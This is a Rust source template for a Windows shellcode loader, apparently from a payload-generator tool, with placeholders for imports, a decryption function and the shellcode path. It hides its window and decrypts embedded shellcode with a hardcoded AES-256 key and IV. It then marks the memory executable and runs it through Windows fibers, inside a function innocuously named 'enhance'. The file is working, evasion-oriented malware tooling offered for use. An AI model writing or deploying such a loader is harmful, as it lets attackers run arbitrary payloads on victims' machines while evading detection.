#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

use std::mem::transmute;
use std::ptr::{copy, null};
use windows_sys::Win32::Foundation::{GetLastError, FALSE};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};

use std::include_bytes;

{{IMPORTS}}

{{DECRYPTION_FUNCTION}}

fn enhance(buf: Vec<u8>) {
    // thanks to https://github.com/b1nhack/rust-shellcode/blob/5f82eebdb0694fbca66cb8a2825777845dbb430b/create_fiber/src/main.rs
    unsafe {
        let addr = VirtualAlloc(null(), buf.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if addr.is_null() {
            if cfg!(debug_assertions) {
                println!("[-] Error calling VirtualAlloc: {}", GetLastError());
                panic!();
            } else {
                panic!();
            }
        }

        let mut old = PAGE_READWRITE;
        copy(buf.as_ptr(), addr.cast(), buf.len());
        let res = VirtualProtect(addr, buf.len(), PAGE_EXECUTE_READWRITE, &mut old);

        if res == FALSE {
            if cfg!(debug_assertions) {
                println!("[-] Error calling VirtualProtect: {}", GetLastError());
                panic!();
            } else {
                panic!();
            }
        }

        let fiber = CreateFiber(0, transmute(addr), null());
        if fiber.is_null() {
            if cfg!(debug_assertions) {
                println!("[-] Error calling CreateFiber: {}", GetLastError());
                panic!();
            } else {
                panic!();
            }
        }

        let thread_to_fiber = ConvertThreadToFiber(null());
        if thread_to_fiber.is_null() {
            if cfg!(debug_assertions) {
                println!("[-] Error calling ConvertThreadToFiber: {}", GetLastError());
                panic!();
            } else {
                panic!();
            }
        }

        SwitchToFiber(fiber);
    }
}

fn main() {
    let buf = include_bytes!({{PATH_TO_SHELLCODE}});

    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }
    let key: [u8; 32] = [
        226, 88, 120, 54, 196, 196, 236, 255, 3, 194, 126, 186, 31, 11, 234, 145, 173, 225, 85, 18,
        155, 6, 107, 154, 171, 29, 9, 34, 207, 56, 19, 228,
    ];
    let iv: [u8; 16] = [
        38, 157, 65, 53, 214, 182, 60, 149, 221, 33, 209, 214, 142, 158, 200, 184,
    ];
    vec = aes_256_decrypt(&vec, &key, &iv);

    enhance(vec.clone());
}

{{DLL_MAIN}}